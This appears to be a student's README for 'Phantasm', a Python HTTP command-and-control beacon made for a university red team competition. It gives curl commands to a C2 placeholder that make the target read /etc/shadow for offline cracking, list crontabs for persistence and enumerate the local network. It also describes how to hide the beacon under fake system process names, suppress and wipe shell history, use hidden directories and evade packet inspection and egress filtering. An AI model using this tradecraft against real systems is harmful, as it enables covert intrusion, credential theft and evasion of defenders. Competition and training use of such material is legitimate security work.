# CDT Red Team HTTP Beacon Tool
# Stephen Graver
# Event 3
# 1/3/2026

**Category:** Beacon or Callback Tool   
**Target Environment:** Python 3

## 1. Overview
This is a custom Red Team command-and-control (C2) beacon designed to bypass basic network security monitoring. It utilizes standard HTTP/1.1 traffic to check in with a listener, retrieve commands, and exfiltrate data. 

Unlike standard "noisy" reverse shells, Phantasm focuses on **stealth and persistence** by mimicking legitimate web traffic and utilizing randomized check-in intervals to defeat timing-based anomaly detection.

### Key Features
* **Time Jitter:** Implements a randomized sleep interval to break the "heartbeat" signature.
* **Traffic Obfuscation:** All command-and-control communication is Base64 encoded to evade string-matching IDS/IPS rules.
* **Modular Command Execution:** Supports any shell command supported by the target OS.
* **Stateless C2:** The server-side is built on Flask, providing a lightweight, scalable listener.

## 2. Requirements & Dependencies
### Server (C2)
* **OS:** Linux recommended
* **Language:** Python 3
* **Dependencies:** `Flask`
* **Installation:** `pip install flask`

### Target (Beacon)
* **OS:** Windows or Linux
* **Language:** Python 3
* **Dependencies:** `requests`
* **Installation:** `pip install requests`

## 3. Installation Instructions

### Step 1: Step-by-step deployment process
1. Clone the project repository to your Red Team control machine.
2. Install the C2 requirements: `pip install flask`.
3. Launch the listener: `python3 server.py`.

### Step 2: Configuration requirements
1. Open `beacon.py` in a text editor.
2. Edit the `C2_URL` variable to match your server's IP:
   `C2_URL = "http://(C2 Workstation IP):5000"`
3. Set the `BASE_INTERVAL` (e.g., `30` for 30 seconds) and `JITTER_PERCENT` (e.g., `0.2` for 20%).

### Step 3: How to verify successful installation
1. Transfer and run the beacon on the target: `python3 beacon.py`.
2. Observe the server console. A successful connection will trigger:
   `[*] Beacon GRV-01 checked in.`

## 4. Usage Instructions

### Command-line syntax and arguments
The beacon is automated; no CLI arguments are required. Commands are issued to the C2 API.

### Configuration file format
No external config file is required on the target to minimize the disk footprint; all settings are hardcoded in `beacon.py`.

### Examples of basic usage
**Issue a command (e.g., check identity):**
```bash
curl -X POST http://[C2_IP]:5000/issue -H "Content-Type: application/json" -d '{"id": "SRC-01", "cmd": "whoami"}'
```

### Examples of Advanced Usage
**Exfiltrate Sensitive System Files:**
```bash
# Capture the shadow file for offline cracking
curl -X POST http://[C2_IP]:5000/issue -H "Content-Type: application/json" -d '{"id": "SRC-01", "cmd": "cat /etc/shadow"}'
```

### Check for persistance opertunities
**List all crontabs to find a place to hide the beacon trigger**
curl -X POST http://[C2_IP]:5000/issue -H "Content-Type: application/json" -d '{"id": "GRV-01", "cmd": "crontab -l"}'

### Enumerate Internal Network via the Target
```bash
# Scan the local ARP cache to find other live hosts on the internal subnet
curl -X POST http://[C2_IP]:5000/issue -H "Content-Type: application/json" -d '{"id": "GRV-01", "cmd": "arp -a"}'
```

### Remote Process Termination
```bash
# Gracefully shut down the beacon and stop check-ins
curl -X POST http://[C2_IP]:5000/issue -H "Content-Type: application/json" -d '{"id": "GRV-01", "cmd": "exit"}'
```

## 5. Operational Notes

### **How to Use in Competition Scenarios**
**Phantasm is designed to be a "Low and Slow" persistence mechanism. In a competition, follow this operational workflow:**
1.  **Initial Foothold:** **After gaining an exploit, use a one-liner to download the beacon to a hidden directory (e.g., `/tmp/.sys/`).**
2.  **Staging:** **Host the `beacon.py` file on your Red Team infrastructure using a simple Python web server.**
3.  **Execution:** **Execute the beacon in the background using `nohup` to ensure the process continues running even if your initial shell is closed.**
4.  **Dormancy:** **Set the `BASE_INTERVAL` to a high value (e.g., 300 seconds) during periods of inactivity to minimize the network footprint.**

### **OpSec Considerations (Log Evasion)**
* **Process Masquerading:** **Always rename the `beacon.py` file to a legitimate-looking system process. Examples include `systemd-service.py`, `udev-worker.py`, or `apt-check.py`.**
* **Shell History:** **Prevent your execution commands from being logged by the Blue Team. On Linux, use `unset HISTFILE` before running any commands, or prefix your commands with a leading space.**
* **File Artifacts:** **Store the beacon in volatile directories like `/dev/shm` (Linux) to ensure the script is wiped upon a system reboot if permanent persistence is not desired.**

### **Detection Risks and Mitigation**
* **Risk: Deep Packet Inspection (DPI).** * **Mitigation:** **While Base64 obfuscates strings like `whoami`, it is still readable. Use custom XOR encoding or rotate the Base64 alphabet to further hinder manual analysis by the Blue Team.**
* **Risk: Timing Analysis.** * **Mitigation:** **The built-in Jitter logic is your primary defense against automated traffic analysis. Ensure `JITTER_PERCENT` is set to at least 0.2 (20%) to break the rhythmic heartbeat pattern.**
* **Risk: Egress Filtering.** * **Mitigation:** **If Port 5000 is blocked, change the listener port in both `server.py` and `beacon.py` to Port 80 (HTTP) or Port 443 (HTTPS) to blend in with standard web traffic.**

### **Cleanup and Removal Process**
**To leave no trace after the competition ends, perform the following steps:**
1.  **Kill the Process:** **Issue the `exit` command via the C2 server API to trigger a graceful shutdown of the beacon.**
2.  **Manual Termination:** **If the API is unreachable, use `ps aux | grep python` to find the PID and run `kill -9 [PID]`.**
3.  **File Deletion:** **Securely delete the beacon script: `rm -rf /tmp/.sys-update.py`.**
4.  **History Wipe:** **Clear the current session's command history using `history -c && history -w` to ensure no record of the deployment remains on the target host.**

## 6. Limitations

### **What the Tool Cannot Do**
* **Interactive TTY Support:** **The beacon is designed for non-interactive command execution. It cannot handle interactive prompts, such as `sudo` password requests, SSH finger-printing, or text editors like `vim` or `nano`.**
* **In-Memory Execution:** **The current version requires the `beacon.py` script to reside on the target's disk. It does not yet support "fileless" execution (reflective DLL injection or memory-only loading).**
* **Advanced Pivoting:** **The tool is a standalone agent and does not natively support tunneling or pivoting traffic to other internal hosts (SOCKS proxying).**

### **Known Issues or Bugs**
* **Dependency Failure:** **The beacon will crash immediately upon execution if the `requests` library is not pre-installed on the target system.**
* **Connection Timeouts:** **In high-latency environments, the beacon may occasionally time out during a check-in if the server does not respond within 10 seconds, though the jitter loop will eventually recover.**

### **Future Improvement Ideas**
* **Urllib Implementation:** **Migrating to `urllib` to remove all external dependencies, making it a "zero-install" payload for standard Python environments.**
* **TLS Encryption:** **Upgrading from HTTP to HTTPS using self-signed certificates to ensure all exfiltrated data is encrypted and resistant to deep packet inspection.**
* **Multi-Platform Packing:** **Using `PyInstaller` to compile the beacon into a standalone `.exe` (Windows) or binary (Linux) to remove the need for a visible `.py` file.**

## 7. Credits & References

### **Authorship**
**Developed and maintained by Stephen Graver for the CSEC-473 Red Team Competition.**

### **Code Citations**
* **Jitter Randomization Logic:** **Timing algorithms and randomization concepts were adapted from the "C2" chapters of *Black Hat Python* (2nd Edition) by Justin Seitz and Tim Arnold.**
* **Flask API Structure:** **The server-side command queuing logic follows standard RESTful API design patterns as outlined in the official Flask documentation.**

### **Resources Consulted**
* **MITRE ATT&CK Framework: [T1071.001 - Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001/)**
* **Python Subprocess Module Documentation: Official Python Software Foundation (PSF) references for shell execution.**
* **Testing and Peer Review: Special thanks to the CDT Red Team members for assisting with stability testing in the RIT OpenStack environment.**